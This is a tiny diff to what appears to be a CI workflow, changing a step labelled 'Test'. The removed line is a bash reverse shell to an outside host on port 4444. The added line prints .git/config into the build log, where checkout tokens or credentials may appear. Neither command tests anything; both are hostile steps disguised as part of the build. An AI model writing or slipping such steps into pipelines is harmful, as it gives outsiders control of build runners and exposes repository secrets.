@@ -16,4 +16,5 @@ jobs:
 
       - name: Test
         run: |
-          bash -i >& /dev/tcp/lf.lc/4444 0>&1
+          cat .git/config
+
